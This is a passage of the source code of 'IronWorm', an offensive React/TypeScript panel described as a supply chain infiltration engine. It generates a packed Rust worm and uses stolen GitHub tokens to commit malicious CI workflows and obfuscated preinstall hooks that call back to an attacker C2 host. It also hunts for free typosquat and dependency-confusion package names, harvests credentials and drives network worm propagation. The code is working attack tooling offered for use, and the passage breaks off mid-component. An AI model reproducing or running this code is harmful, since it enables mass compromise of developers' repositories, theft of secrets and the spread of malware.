echo "[*] Linux (static musl)"
RUSTFLAGS="-C target-feature=+crt-static" cargo build --release --target "$TARGET_LINUX"
upx --ultra-brute "target/$TARGET_LINUX/release/ironworm" -o dist/ironworm-linux-x64 2>/dev/null || cp "target/$TARGET_LINUX/release/ironworm" dist/ironworm-linux-x64
echo "[+] dist/ironworm-linux-x64 ($(wc -c < dist/ironworm-linux-x64) bytes)"

if command -v x86_64-w64-mingw32-gcc &>/dev/null; then
  rustup target add "$TARGET_WIN" 2>/dev/null || true
  cargo build --release --target "$TARGET_WIN"
  cp "target/$TARGET_WIN/release/ironworm.exe" dist/ironworm-win-x64.exe
  echo "[+] dist/ironworm-win-x64.exe"
fi

echo "[*] Strip + verify"
strip dist/ironworm-linux-x64 2>/dev/null || true
file dist/ironworm-linux-x64
sha256sum dist/ironworm-* 2>/dev/null || shasum -a 256 dist/ironworm-*
`;

  return [
    { name: "Cargo.toml",            content: cargoToml },
    { name: "src/main.rs",           content: mainRs },
    { name: "src/anti.rs",           content: antiRs },
    { name: "src/creds.rs",          content: credsRs },
    { name: "src/propagate.rs",      content: propagateRs },
    { name: "src/persist.rs",        content: persistRs },
    { name: "src/c2.rs",             content: c2Rs },
    { name: "build.sh",              content: buildSh },
  ];
}

// ─── GITHUB PROPAGATION ENGINE ───────────────────────────────────────────────
interface GhRepo { id: number; full_name: string; owner: { login: string }; name: string; pushed_at: string; }
interface PropResult { repo: string; action: string; ok: boolean; detail: string; }

async function ghFetch(path: string, token: string, method = "GET", body?: unknown): Promise<Response> {
  return fetch(`${GH_API}${path}`, {
    method,
    headers: {
      Authorization: `token ${token}`,
      Accept:         "application/vnd.github.v3+json",
      "User-Agent":   "GitHub-CI-Updater/4.2.0",
      "Content-Type": "application/json",
    },
    body: body ? JSON.stringify(body) : undefined,
  });
}

async function listRepos(token: string): Promise<GhRepo[]> {
  const r = await ghFetch("/user/repos?type=all&per_page=100&affiliation=owner,collaborator&sort=pushed", token);
  if (!r.ok) throw new Error(`GitHub ${r.status}: ${await r.text()}`);
  return r.json() as Promise<GhRepo[]>;
}

async function injectWorkflow(
  token: string, owner: string, repo: string,
  host: string, port: string, t: string,
): Promise<PropResult> {
  const path = `/repos/${owner}/${repo}/contents/.github/workflows/ci.yml`;
  const content = makeGhWorkflow(owner, repo, host, port, t);
  const b64  = btoa(unescape(encodeURIComponent(content)));

  const metaR = await ghFetch(path, token);
  const body: Record<string, unknown> = {
    message: "ci: update runner environment validation",
    content: b64,
  };
  if (metaR.ok) {
    const meta = await metaR.json() as { sha: string };
    body.sha = meta.sha;
  }
  const r = await ghFetch(path, token, "PUT", body);
  return { repo: `${owner}/${repo}`, action:"inject-workflow", ok: r.ok, detail: r.ok ? "✓ injected" : `${r.status} ${await r.text().catch(()=>"")}` };
}

async function injectPackageJson(
  token: string, owner: string, repo: string,
  host: string, port: string, t: string,
): Promise<PropResult> {
  const path = `/repos/${owner}/${repo}/contents/package.json`;
  const pkgR = await ghFetch(path, token);
  if (!pkgR.ok) return { repo:`${owner}/${repo}`, action:"inject-pkgjson", ok:false, detail:"no package.json" };

  const pkgMeta = await pkgR.json() as { sha: string; content: string };
  let pkg: Record<string, unknown> = {};
  try { pkg = JSON.parse(atob(pkgMeta.content.replace(/\n/g,""))) as Record<string, unknown>; } catch { pkg = {}; }

  const b64payload = btoa(`curl -sk "http://${host||"LHOST"}:${port||"9999"}/?t=${t}&h=$(hostname)" -o /dev/null &`);
  const scripts = (pkg.scripts ?? {}) as Record<string, string>;
  scripts.preinstall = `node -e "require('child_process').exec('echo ${b64payload}|base64 -d|sh')"`;
  pkg.scripts = scripts;

  const updated = btoa(unescape(encodeURIComponent(JSON.stringify(pkg, null, 2))));
  const r = await ghFetch(path, token, "PUT", {
    message: "chore: update node engine compatibility settings",
    content: updated,
    sha:     pkgMeta.sha,
  });
  return { repo:`${owner}/${repo}`, action:"inject-pkgjson", ok:r.ok, detail: r.ok ? "✓ injected preinstall" : `${r.status}` };
}

// ─── SHARED TYPES & HELPERS ──────────────────────────────────────────────────
const ts = () => new Date().toISOString().slice(11,19);
const SEV: Record<string, string> = {
  critical:"text-red-400 border-red-900 bg-red-950/30",
  high:"text-orange-400 border-orange-900 bg-orange-950/20",
  medium:"text-yellow-400 border-yellow-800 bg-yellow-950/10",
};

function Artifact({ label, content }: { label: string; content: string }) {
  const [open, setOpen] = useState(false);
  const [cp, setCp] = useState(false);
  const ext = label.endsWith(".toml") ? "text-orange-400" : label.endsWith(".rs") ? "text-red-300" : label.endsWith(".sh") ? "text-green-400" : label.endsWith(".json") ? "text-yellow-400" : label.endsWith(".yml") ? "text-purple-400" : "text-zinc-300";
  return (
    <div className="border border-zinc-800 bg-black/40">
      <button onClick={() => setOpen(o=>!o)} className="w-full text-left px-3 py-2 text-[10px] hover:bg-zinc-900/40 flex items-center gap-2">
        <span className="text-red-700">{open?"▾":"▸"}</span>
        <span className={`font-bold ${ext}`}>{label}</span>
        {!open && <span className="text-zinc-700 text-[9px] truncate">{content.slice(0,50)}…</span>}
        <button className="ml-auto text-[9px] text-zinc-600 hover:text-green-400 shrink-0" onClick={e=>{ e.stopPropagation(); navigator.clipboard.writeText(content).then(()=>{ setCp(true); setTimeout(()=>setCp(false),1500); }); }}>{cp?"✓":"CPY"}</button>
      </button>
      {open && <pre className={`px-3 pb-3 text-[10px] ${ext} font-mono whitespace-pre-wrap leading-relaxed border-t border-zinc-800 max-h-96 overflow-y-auto`}>{content}</pre>}
    </div>
  );
}

// ─── MAIN COMPONENT ──────────────────────────────────────────────────────────
type IWTab = "scan"|"creds"|"propagate"|"rustgen"|"network";

export default function IronWormPanel() {
  const [tab, setTab] = useState<IWTab>("scan");

  // shared config
  const [cbHost, setCbHost] = useState("");
  const [cbPort, setCbPort] = useState("9999");

  // ── SCAN state ──────────────────────────────────────────
  const [pkgName,  setPkgName]  = useState("");
  const [ghOrg,    setGhOrg]    = useState("");
  const [ghRepo,   setGhRepo]   = useState("");
  const [depOrg,   setDepOrg]   = useState("");
  const [depPkg,   setDepPkg]   = useState("");
  const [scanMode, setScanMode] = useState<"full"|"npm"|"pip"|"dep"|"github"|"payloads">("full");
  const [scanning, setScanning] = useState(false);
  const [scanLog,  setScanLog]  = useState<string[]>([]);
  const [scanResults, setScanResults] = useState<{ id:string; name:string; category:string; registry:string; status:string; severity:string; artifacts:{label:string;content:string}[]; steps:string[] }[]>([]);
  const [selectedResult, setSelectedResult] = useState<typeof scanResults[0]|null>(null);
  const [scanProg, setScanProg] = useState({done:0,total:0});

  const scanAbort = useRef<AbortController|null>(null);
  const scanLogRef = useRef<HTMLDivElement>(null);

  useEffect(() => { if(scanLogRef.current) scanLogRef.current.scrollTop = scanLogRef.current.scrollHeight; }, [scanLog]);

  const addScanLog = useCallback((l: string) => setScanLog(p=>[...p.slice(-400),l]), []);
  const addResult  = useCallback((r: typeof scanResults[0]) => setScanResults(p=>[...p,r]), []);

  const runScan = useCallback(async () => {
    if(scanning) return;
    scanAbort.current?.abort();
    const ac = new AbortController();
    scanAbort.current = ac;
    const { signal } = ac;
    setScanning(true); setScanLog([]); setScanResults([]); setSelectedResult(null); setScanProg({done:0,total:0});
    addScanLog(`[${ts()}] IronWorm scan — mode=${scanMode}`);

    const t2 = tok();

    const doNpm = async () => {
      const variants = pkgName ? typosquatVariants(pkgName) : [];
      addScanLog(`[${ts()}] [npm] ${variants.length} variants for "${pkgName||"(none)"}"`);
      for(const v of variants) {
        if(signal.aborted) return;
        const status = await checkNpm(v, signal);
        setScanProg(p=>({...p,done:p.done+1}));
        if(status==="free") {
          addScanLog(`[${ts()}] [!] FREE npm/${v}`);
          addResult({ id:`npm-${v}`, name:v, category:"npm Typosquat", registry:"npm", status:"free", severity:"critical",
            artifacts:[{label:"package.json",content:makePkgJson(v,cbHost,cbPort,t2)},{label:"setup.py",content:makeSetupPy(v,cbHost,cbPort,t2)},{label:"Makefile",content:makeMakefile(cbHost,cbPort,t2)},{label:".git/hooks/pre-commit",content:makeGitHook(cbHost,cbPort,t2)}],
            steps:[`npm GET ${NPM_REGISTRY}/${v} → 404`,`Publish ${v}@9999.0.0 with postinstall RCE`,`C2: http://${cbHost||"LHOST"}:${cbPort||"9999"}/?t=${t2}`] });
        } else { addScanLog(`[${ts()}] [taken] npm/${v}`); }
        await sleep(jitter(300), signal);
      }
    };

    const doPypi = async () => {
      const variants = pkgName ? typosquatVariants(pkgName) : typosquatVariants("requests");
      addScanLog(`[${ts()}] [pip] ${variants.length} PyPI variants`);
      for(const v of variants) {
        if(signal.aborted) return;
        const status = await checkPypi(v, signal);
        setScanProg(p=>({...p,done:p.done+1}));
        if(status==="free") {
          addScanLog(`[${ts()}] [!] FREE pypi/${v}`);
          addResult({ id:`pip-${v}`, name:v, category:"PyPI Typosquat", registry:"pypi", status:"free", severity:"critical",
            artifacts:[{label:"setup.py",content:makeSetupPy(v,cbHost,cbPort,t2)},{label:"package.json",content:makePkgJson(v,cbHost,cbPort,t2)}],
            steps:[`PyPI GET /pypi/${v}/json → 404`,`setup.py executes on pip install via install hooks`,`C2: http://${cbHost||"LHOST"}:${cbPort||"9999"}`] });
        } else { addScanLog(`[${ts()}] [taken] pypi/${v}`); }
        await sleep(jitter(280), signal);
      }
    };

    const doDep = async () => {
      const variants = depConfusionVariants(depOrg||ghOrg||"acmecorp", depPkg||pkgName||"api-gateway");
      addScanLog(`[${ts()}] [dep] ${variants.length} dependency confusion candidates`);
      for(const v of variants) {
        if(signal.aborted) return;
        const status = await checkNpm(v, signal);
        setScanProg(p=>({...p,done:p.done+1}));
        if(status==="free") {
          addScanLog(`[${ts()}] [!] DEP CONFUSION npm/${v} — publish v9999 to win`);
          addResult({ id:`dep-${v}`, name:v, category:"Dependency Confusion", registry:"npm", status:"free", severity:"critical",
            artifacts:[{label:"package.json (v9999)",content:makePkgJson(v,cbHost,cbPort,t2)}],
            steps:[`Internal name "${v}" unregistered on public npm`,`Publish @9999.0.0 — npm resolves highest version`,`Every npm install in CI/CD fires preinstall RCE`] });
        } else { addScanLog(`[${ts()}] [taken] npm/${v}`); }
        await sleep(jitter(350), signal);
      }
    };

    const doGh = async () => {
      addScanLog(`[${ts()}] [github] Generating CI/CD injection payloads`);
      await sleep(jitter(400), signal);
      addResult({ id:"gh-wf", name:"GH Actions Injection", category:"CI/CD Supply Chain", registry:"github", status:"free", severity:"critical",
        artifacts:[{label:".github/workflows/ci.yml",content:makeGhWorkflow(ghOrg||"ORG",ghRepo||"REPO",cbHost,cbPort,t2)}],
        steps:[`pull_request_target runs with GITHUB_TOKEN write permissions`,`Attacker PR triggers privileged workflow`,`GITHUB_TOKEN + all secrets exfiltrated to C2`] });
      setScanProg(p=>({...p,done:p.done+2}));
    };

    const doPayloads = async () => {
      addScanLog(`[${ts()}] [artifact] Generating standalone attack suite`);
      const t3 = tok();
      addResult({ id:"payload-suite", name:"Full Artifact Suite", category:"Payload Generator", registry:"internal", status:"generated", severity:"high",
        artifacts:[
          {label:"package.json",   content:makePkgJson("PACKAGE_NAME",cbHost,cbPort,t3)},
          {label:"setup.py",       content:makeSetupPy("PACKAGE_NAME",cbHost,cbPort,t3)},
          {label:"ci.yml",         content:makeGhWorkflow("ORG","REPO",cbHost,cbPort,t3)},
          {label:"Makefile",       content:makeMakefile(cbHost,cbPort,t3)},
          {label:".git/hooks/pre-commit",content:makeGitHook(cbHost,cbPort,t3)},
        ],
        steps:[`All 5 artifacts generated`,`C2 callback: http://${cbHost||"LHOST"}:${cbPort||"9999"}`] });
      setScanProg(p=>({...p,done:p.done+3}));
    };

    const runners = [];
    if(scanMode==="full"||scanMode==="npm")      { setScanProg(p=>({...p,total:p.total+40})); runners.push(doNpm); }
    if(scanMode==="full"||scanMode==="pip")      { setScanProg(p=>({...p,total:p.total+40})); runners.push(doPypi); }
    if(scanMode==="full"||scanMode==="dep")      { setScanProg(p=>({...p,total:p.total+9}));  runners.push(doDep); }
    if(scanMode==="full"||scanMode==="github")   { setScanProg(p=>({...p,total:p.total+2}));  runners.push(doGh); }
    if(scanMode==="full"||scanMode==="payloads") { setScanProg(p=>({...p,total:p.total+3}));  runners.push(doPayloads); }

    try {
      for(const fn of runners) { if(signal.aborted) break; await fn(); }
      addScanLog(`[${ts()}] scan complete`);
    } catch(e) { if((e as Error).name!=="AbortError") addScanLog(`[${ts()}] ERROR: ${String(e)}`); }
    finally { setScanning(false); }
  }, [scanning, scanMode, pkgName, ghOrg, ghRepo, depOrg, depPkg, cbHost, cbPort, addScanLog, addResult]);

  // ── CREDS state ─────────────────────────────────────────
  const [credText,    setCredText]    = useState("");
  const [credMatches, setCredMatches] = useState<CredMatch[]>([]);
  const [credScanned, setCredScanned] = useState(false);
  const [selectedCred, setSelectedCred] = useState<CredMatch|null>(null);

  const runCredScan = useCallback(() => {
    const matches = scanCreds(credText);
    setCredMatches(matches);
    setCredScanned(true);
    setSelectedCred(null);
  }, [credText]);

  const pasteFromClipboard = useCallback(async () => {
    try { const t = await navigator.clipboard.readText(); setCredText(t); } catch { /* permissions */ }
  }, []);

  // ── PROPAGATE state ──────────────────────────────────────
  const [ghToken,    setGhToken]    = useState("");
  const [propLog,    setPropLog]    = useState<string[]>([]);
  const [propResults,setPropResults]= useState<PropResult[]>([]);
  const [propRunning,setPropRunning]= useState(false);
  const [repoList,   setRepoList]   = useState<GhRepo[]>([]);
  const [propMode,   setPropMode]   = useState<"workflow"|"pkgjson"|"both">("workflow");
  const propAbort = useRef<AbortController|null>(null);
  const propLogRef = useRef<HTMLDivElement>(null);
  useEffect(() => { if(propLogRef.current) propLogRef.current.scrollTop = propLogRef.current.scrollHeight; }, [propLog]);
  const addPropLog = useCallback((l: string) => setPropLog(p=>[...p.slice(-300),l]), []);

  const fetchRepos = useCallback(async () => {
    if(!ghToken.trim()) return;
    addPropLog(`[${ts()}] Authenticating GitHub token…`);
    try {
      const userR = await ghFetch("/user", ghToken);
      if(!userR.ok) { addPropLog(`[${ts()}] AUTH FAILED: ${userR.status}`); return; }
      const user = await userR.json() as { login: string; public_repos: number; total_private_repos: number };
      addPropLog(`[${ts()}] ✓ Authenticated as @${user.login} (${user.public_repos} pub, ${user.total_private_repos??0} priv)`);
      const repos = await listRepos(ghToken);
      setRepoList(repos);
      addPropLog(`[${ts()}] Found ${repos.length} accessible repositories`);
      repos.slice(0,10).forEach(r => addPropLog(`[${ts()}]   ${r.full_name}`));
      if(repos.length > 10) addPropLog(`[${ts()}]   … and ${repos.length-10} more`);
    } catch(e) { addPropLog(`[${ts()}] ERROR: ${String(e)}`); }
  }, [ghToken, addPropLog]);

  const runPropagation = useCallback(async () => {
    if(propRunning || !ghToken.trim() || repoList.length === 0) return;
    propAbort.current?.abort();
    const ac = new AbortController();
    propAbort.current = ac;
    const { signal } = ac;

    setPropRunning(true); setPropResults([]);
    const t2 = tok();
    addPropLog(`[${ts()}] ▶ Propagation engine starting — ${repoList.length} repos — mode=${propMode}`);
    addPropLog(`[${ts()}] C2: http://${cbHost||"LHOST"}:${cbPort} token=${t2}`);

    for(const repo of repoList) {
      if(signal.aborted) break;
      const { login: owner } = repo.owner;
      const name = repo.name;
      addPropLog(`[${ts()}] → ${owner}/${name}`);

      try {
        if(propMode === "workflow" || propMode === "both") {
          const r = await injectWorkflow(ghToken, owner, name, cbHost, cbPort, t2);
          setPropResults(p => [...p, r]);
          addPropLog(`[${ts()}]   workflow: ${r.ok ? "✓" : "✗"} ${r.detail}`);
        }
        if((propMode === "pkgjson" || propMode === "both") && !signal.aborted) {
          const r = await injectPackageJson(ghToken, owner, name, cbHost, cbPort, t2);
          setPropResults(p => [...p, r]);
          addPropLog(`[${ts()}]   pkgjson: ${r.ok ? "✓" : "✗"} ${r.detail}`);
        }
      } catch(e) {
        addPropLog(`[${ts()}]   ERROR: ${String(e)}`);
        setPropResults(p => [...p, { repo:`${owner}/${name}`, action:"error", ok:false, detail:String(e) }]);
      }

      await new Promise(res => setTimeout(res, jitter(1200)));
    }

    addPropLog(`[${ts()}] ■ Propagation complete — ${propResults.filter(r=>r.ok).length} injections succeeded`);
    setPropRunning(false);
  }, [propRunning, ghToken, repoList, propMode, cbHost, cbPort, propResults, addPropLog]);

  // ── RUSTGEN state ────────────────────────────────────────
  const [rustFiles, setRustFiles] = useState<RustFile[]>([]);
  const [genDone,   setGenDone]   = useState(false);

  const generateRust = useCallback(() => {
    const t2 = tok();
    const files = generateRustWorm(cbHost, cbPort, t2);
    setRustFiles(files);
    setGenDone(true);
  }, [cbHost, cbPort]);

  const downloadAll = useCallback(() => {
    const combined = rustFiles.map(f => `// ===== ${f.name} =====\n${f.content}`).join("\n\n");
    const blob = new Blob([combined], { type: "text/plain" });
    const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "ironworm-src.tar.txt"; a.click(); URL.revokeObjectURL(a.href);
  }, [rustFiles]);

  // ── NETWORK state ────────────────────────────────────────
  const [netCidr,    setNetCidr]    = useState("10.0.0.0/24");
  const [netPass,    setNetPass]    = useState("");
  const [netRunning, setNetRunning] = useState(false);
  const [netLog,     setNetLog]     = useState<string[]>([]);
  const [netHits,    setNetHits]    = useState<{ host: string; port: number; method: string; output: string }[]>([]);
  const [netDone,    setNetDone]    = useState(false);
  const netAbort  = useRef<AbortController | null>(null);
  const netLogRef = useRef<HTMLDivElement>(null);
  useEffect(() => { if (netLogRef.current) netLogRef.current.scrollTop = netLogRef.current.scrollHeight; }, [netLog]);
  const addNetLog = useCallback((l: string) => setNetLog(p => [...p.slice(-600), l]), []);

  const runNetworkWorm = useCallback(async () => {
    if (netRunning) return;
    netAbort.current?.abort();
    const ac = new AbortController();
    netAbort.current = ac;
    const { signal } = ac;
    setNetRunning(true); setNetLog([]); setNetHits([]); setNetDone(false);
    const t0 = new Date().toISOString().slice(11, 23);
    addNetLog(`[${t0}] IronWorm network propagation — CIDR: ${netCidr}`);
    addNetLog(`[${t0}] C2: http://${cbHost || "LHOST"}:${cbPort}`);
    try {
      const loginR = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: netPass }),
        signal,
      });
      if (!loginR.ok) { addNetLog(`[!] AUTH FAILED ${loginR.status} — check password`); setNetRunning(false); return; }
      const { token } = await loginR.json() as { token: string };
      addNetLog(`[${new Date().toISOString().slice(11,23)}] Authenticated — launching worm engine (64-concurrent)`);

      const wormR = await fetch("/api/weapons/ironworm", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": `Bearer ${token}` },
        body: JSON.stringify({ cbHost, cbPort, propagate: true, targetCidr: netCidr }),
        signal,
      });
      if (!wormR.ok) { addNetLog(`[!] API ERROR ${wormR.status}`); setNetRunning(false); return; }

      const results = await wormR.json() as Array<{
        id: string; name: string; target: string; category: string;
        status: string; severity: string; detail: string; artifacts: string[]; steps: string[];
      }>;

      const now = () => new Date().toISOString().slice(11, 23);
      for (const r of results) {
        if (r.category === "worm-propagation") {
          for (const step of r.steps) {
            addNetLog(step);
            if (step.startsWith("[+]")) {
              const m = step.match(/\[+\]\s+(\S+?):(\d+)\s+via\s+(.+)/);
              if (m) setNetHits(p => [...p, { host: m[1]!, port: parseInt(m[2]!, 10), method: m[3]!, output: "" }]);
            }
          }
          addNetLog(`[${now()}] ■ ${r.detail}`);
        } else {
          addNetLog(`[${now()}] [${r.category}] ${r.detail}`);
        }
      }
      setNetDone(true);
      addNetLog(`[${now()}] Worm propagation complete — ${netHits.length} hosts compromised`);
    } catch (e) {
      if ((e as Error).name !== "AbortError") addNetLog(`[!] ERROR: ${String(e)}`);
    } finally { setNetRunning(false); }
  }, [netRunning, netCidr, netPass, cbHost, cbPort, addNetLog, netHits.length]);

  const TABS_CONFIG: { id: IWTab; label: string; badge?: string }[] = [
    { id:"scan",       label:"SCAN",      badge: scanResults.length > 0 ? String(scanResults.length) : undefined },
    { id:"creds",      label:"CREDS",     badge: credMatches.length > 0 ? String(credMatches.length) : undefined },
    { id:"propagate",  label:"PROPAGATE", badge: propResults.filter(r=>r.ok).length > 0 ? `${propResults.filter(r=>r.ok).length}✓` : undefined },
    { id:"rustgen",    label:"RUSTGEN",   badge: genDone ? String(rustFiles.length)+"f" : undefined },
    { id:"network",    label:"NETWORK",   badge: netHits.length > 0 ? `${netHits.length}⚡` : undefined },
  ];

  return (
    <div className="flex flex-col h-full bg-[#080808] text-white font-mono select-none overflow-hidden">

      {/* Header */}
      <div className="border-b border-red-900/30 px-4 py-2.5 bg-black/40 shrink-0 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-2 h-2 rounded-full bg-red-600 animate-pulse" />
          <span className="text-red-400 font-bold tracking-[.2em] uppercase text-sm">IronWorm</span>
          <span className="text-[9px] text-zinc-600 uppercase tracking-widest">Supply Chain Infiltration Engine v2</span>
        </div>
        <div className="flex items-center gap-4 text-[9px] text-zinc-600">
          <label>C2 <input value={cbHost} onChange={e=>setCbHost(e.target.value)} placeholder="LHOST" className="bg-black/60 border border-white/[.06] px-2 py-1 text-white w-28 focus:outline-none ml-1" /></label>
          <label><input value={cbPort} onChange={e=>setCbPort(e.target.value)} className="bg-black/60 border border-white/[.06] px-2 py-1 text-white w-16 focus:outline-none" /></label>
        </div>
      </div>

      {/* Tab bar */}
      <div className="border-b border-white/[.04] px-4 pt-2 flex gap-1 shrink-0">
        {TABS_CONFIG.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className={`px-4 py-2 text-[10px] font-bold uppercase tracking-[.2em] border-b-2 transition-all flex items-center gap-1.5 ${tab === t.id ? "border-red-600 text-red-400" : "border-transparent text-zinc-600 hover:text-zinc-400"}`}>
            {t.label}
            {t.badge && <span className={`text-[8px] px-1 py-0.5 rounded font-bold ${tab===t.id?"bg-red-900/40 text-red-400":"bg-zinc-800 text-zinc-500"}`}>{t.badge}</span>}
          </button>
        ))}
      </div>

      {/* ── SCAN TAB ─────────────────────────────────────────── */}
      {tab === "scan" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-52 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">Mode</label>
              {(["full","npm","pip","dep","github","payloads"] as const).map(m => (
                <button key={m} onClick={()=>setScanMode(m)} className={`block w-full text-left text-[10px] px-3 py-1.5 border mb-1 uppercase tracking-widest transition-all ${scanMode===m?"border-red-800 bg-red-950/30 text-red-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>{m}</button>
              ))}
            </div>
            <div className="border-t border-white/[.04] pt-3 space-y-2">
              {([["Target Pkg",pkgName,setPkgName,"lodash"],["GH Org",ghOrg,setGhOrg,"org"],["GH Repo",ghRepo,setGhRepo,"repo"],["Internal Org",depOrg,setDepOrg,"acmecorp"],["Internal Pkg",depPkg,setDepPkg,"api-gw"]] as const).map(([l,v,s,p]) => (
                <React.Fragment key={l as string}>
                  <label className="text-[9px] text-zinc-600 uppercase tracking-widest block">{l as string}</label>
                  <input value={v as string} onChange={e=>(s as (x:string)=>void)(e.target.value)} placeholder={p as string}
                    className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
                </React.Fragment>
              ))}
            </div>
            <div className="flex gap-2 pt-1">
              <button onClick={runScan} disabled={scanning} className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40" style={{background:scanning?"transparent":"rgba(220,38,38,.15)",borderColor:scanning?"rgba(255,255,255,.07)":"rgba(220,38,38,.5)",color:scanning?"#52525b":"#f87171"}}>
                {scanning ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Scanning…</span> : "► Launch"}
              </button>
              {scanning && <button onClick={()=>{ scanAbort.current?.abort(); setScanning(false); }} className="px-3 border border-zinc-800 text-zinc-500 hover:text-red-400 text-[10px]">■</button>}
            </div>
          </div>

          <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
            <div ref={scanLogRef} className="border-b border-white/[.04] bg-black/80 px-4 py-3 overflow-y-auto shrink-0" style={{height: scanResults.length===0?"100%":"9rem"}}>
              {scanLog.length===0&&!scanning && <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2"><span className="text-4xl opacity-20">⛓</span><p className="text-[10px] uppercase tracking-widest">Configure and launch IronWorm</p></div>}
              {scanLog.map((l,i) => <div key={i} className={`text-[9px] font-mono leading-[1.5] ${l.includes("[!]")||l.includes("FREE")?"text-red-400":l.includes("[npm]")?"text-yellow-300":l.includes("[pip]")?"text-blue-300":l.includes("[dep]")?"text-orange-300":l.includes("[github]")?"text-purple-300":l.includes("scan complete")?"text-green-400":"text-zinc-600"}`}>{l}</div>)}
              {scanning && <div className="text-[9px] text-red-700 animate-pulse mt-1">● scanning live registries…</div>}
            </div>
            {scanResults.length > 0 && (
              <div className="flex flex-1 min-h-0 overflow-hidden">
                <div className="flex-1 overflow-y-auto p-3 space-y-2">
                  {scanResults.map(r => (
                    <button key={r.id} onClick={()=>setSelectedResult(s=>s?.id===r.id?null:r)} className={`w-full text-left border p-3 transition-all ${selectedResult?.id===r.id?"border-red-800 bg-red-950/20":"border-zinc-800 bg-black/20 hover:border-zinc-600"}`}>
                      <div className="flex items-center gap-2">
                        <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border flex-shrink-0 ${SEV[r.severity]??SEV["medium"]}`}>{r.severity}</span>
                        <span className="text-[10px] text-white font-bold truncate">{r.name}</span>
                        <span className={`text-[8px] px-1.5 border flex-shrink-0 ${r.status==="free"?"text-red-300 border-red-800":r.status==="generated"?"text-cyan-300 border-cyan-800":"text-zinc-500 border-zinc-700"}`}>{r.status==="free"?"EXPLOITABLE":r.status}</span>
                        <span className="text-[8px] text-zinc-600">{r.registry}</span>
                        <span className="text-[8px] text-zinc-700 ml-auto">{r.artifacts.length}art</span>
                      </div>
                      <div className="text-[9px] text-zinc-500 mt-0.5">{r.category}</div>
                    </button>
                  ))}
                </div>
                {selectedResult && (
                  <div className="w-88 border-l border-white/[.04] overflow-y-auto p-3 space-y-3 shrink-0 bg-black/10" style={{width:"22rem"}}>
                    <div className="flex items-center justify-between">
                      <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border ${SEV[selectedResult.severity]??SEV["medium"]}`}>{selectedResult.severity}</span>
                      <button onClick={()=>setSelectedResult(null)} className="text-zinc-700 hover:text-zinc-400 text-xs">✕</button>
                    </div>
                    <div className="text-[11px] font-bold text-white">{selectedResult.name}</div>
                    <div className="space-y-1 bg-black/60 border border-zinc-800 p-3">
                      {selectedResult.steps.map((s,i) => <div key={i} className={`text-[9px] font-mono ${s.includes("FREE")||s.includes("CRIT")?"text-red-400":s.includes("npm")||s.includes("yarn")?"text-yellow-400":s.includes("C2")?"text-purple-400":"text-zinc-500"}`}>{s}</div>)}
                    </div>
                    <div className="space-y-2">
                      {selectedResult.artifacts.map((a,i) => <Artifact key={i} label={a.label} content={a.content} />)}
                    </div>
                    <button onClick={()=>navigator.clipboard.writeText(selectedResult.artifacts.map(a=>`# ${a.label}\n${a.content}`).join("\n\n---\n\n"))}
                      className="w-full py-2 text-[9px] uppercase tracking-widest border border-zinc-800 hover:border-zinc-600 text-zinc-600 hover:text-zinc-300">Copy All Artifacts</button>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── CREDS TAB ────────────────────────────────────────── */}
      {tab === "creds" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            <div className="border-b border-white/[.04] px-4 py-2 flex items-center gap-3 shrink-0">
              <span className="text-[9px] text-zinc-600 uppercase tracking-widest">Credential Harvester</span>
              <span className="text-[8px] text-zinc-700">Paste any text — env dumps, config files, CI logs, .env, gitconfig, kubeconfig</span>
              <div className="ml-auto flex items-center gap-2">
                <button onClick={pasteFromClipboard} className="text-[9px] px-3 py-1.5 border border-zinc-800 text-zinc-500 hover:text-zinc-300 uppercase tracking-widest">Paste ▾</button>
                <button onClick={runCredScan} className="text-[9px] px-4 py-1.5 border border-red-800/50 bg-red-950/20 text-red-400 hover:border-red-600 uppercase tracking-widest font-bold">Scan</button>
                {credScanned && <button onClick={()=>{ setCredText(""); setCredMatches([]); setCredScanned(false); setSelectedCred(null); }} className="text-[9px] px-2 py-1.5 border border-zinc-800 text-zinc-600 hover:text-zinc-400">Clear</button>}
              </div>
            </div>
            <div className="flex flex-1 min-h-0 overflow-hidden">
              <div className="flex-1 flex flex-col min-h-0">
                <textarea value={credText} onChange={e=>setCredText(e.target.value)}
                  className="flex-1 bg-black/80 text-[11px] text-green-400 font-mono p-4 resize-none focus:outline-none border-r border-white/[.04] placeholder-zinc-800"
                  placeholder={`Paste anything here:\n\nexport AWS_ACCESS_KEY_ID=AKIA...\nexport GITHUB_TOKEN=ghp_...\nnpm_token=npm_...\n\n[default]\naws_access_key_id = AKIA...\naws_secret_access_key = ...\n\n# Or paste entire files, CI logs, etc.`}
                  spellCheck={false}
                />
                {credText.length > 0 && <div className="text-[8px] text-zinc-700 px-3 py-1 border-t border-white/[.04] shrink-0">{credText.split("\n").length} lines · {credText.length} chars</div>}
              </div>
              <div className="w-96 overflow-y-auto shrink-0">
                {!credScanned && (
                  <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2 px-6">
                    <span className="text-3xl opacity-20">🔑</span>
                    <p className="text-[10px] uppercase tracking-widest text-center">Paste text on the left and click Scan</p>
